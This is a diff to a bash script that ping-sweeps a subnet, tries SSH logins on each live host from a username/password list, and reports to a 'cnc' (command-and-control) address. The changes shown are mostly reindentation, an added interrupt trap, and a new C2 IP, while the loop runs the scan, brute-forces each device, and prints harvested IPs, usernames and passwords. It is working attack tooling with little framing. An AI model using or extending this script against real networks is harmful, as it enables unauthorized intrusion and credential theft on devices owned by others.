@@ -27,8 +27,8 @@ fi
 # Scan network helper
 is_alive_ping()
 {
-  ping -c 1 $1 > /dev/null
-  [ $? -eq 0 ] && echo $i
+	ping -c 1 $1 > /dev/null
+	[ $? -eq 0 ] && echo $i
 }
 
 # scan network main 
@@ -36,7 +36,7 @@ nwscan()
 {
 	for i in $1{2..254}
 	do
-	is_alive_ping $i & disown
+		is_alive_ping $i & disown
 	done
 }
 
@@ -50,7 +50,7 @@ sshTry()
 	IFS=','
 	uname=""
 	pass=""
-	cnc=192.168.1.18:5000
+	cnc=192.168.29.74:5000
 
 	[ ! -f $INPUT ] && { echo "$INPUT file not found"; exit 99; }
 	while read username password
@@ -87,39 +87,45 @@ n=1
 k=1
 while (($n <=5 ))
 do
-echo ""
-echo ""
-echo "running the script for the $k th time"
-echo ""
-echo ""
-echo "Scanning the Network"
-nwscan $ip > ips.txt
-echo ""
-echo ""
-echo "Devices on the network"
-sleep 2
-cat ips.txt
-
-echo ""
-echo ""
-echo "SSH attempt"
-echo ""
-
-while IFS= read -r line; do
-	echo "Brute forcing the device with IP $line"
-	sshTry $line
+	trap 'echo ""; echo"" ;echo "Skipped by the user"; echo"";echo "exiting this $1";exit 0' INT
 	echo ""
 	echo ""
-done < ips.txt
+	echo "running the script for the $k th time"
+	echo ""
+	echo ""
+	echo "Scanning the Network"
 
-echo "Completed!!"
-sleep 1
-echo "IP , User name , Passwords are"
-python3 command_helper.py
-k=($k + 1)
-echo "about to retart in few seconds"
-sleep 4
-echo ""
-echo ""
+	nwscan $ip > ips.txt
+	
+	echo ""
+	echo ""
+	echo "Devices on the network"
+	sleep 2
+	cat ips.txt
+
+	echo ""
+	echo ""
+	echo "SSH attempt"
+	echo ""
+
+	while IFS= read -r line; do
+		echo "Brute forcing the device with IP $line"
+		sshTry $line
+		echo ""
+		echo ""
+	done < ips.txt
+
+	echo "Completed!!"
+	sleep 1
+	echo "IP , User name , Passwords are"
+	
+	python3 command_helper.py
+	
+	k=($k + 1)
+	echo "about to retart in few seconds"
+	sleep 4
+	echo ""
+	echo ""
 done
+
 rm temp.txt
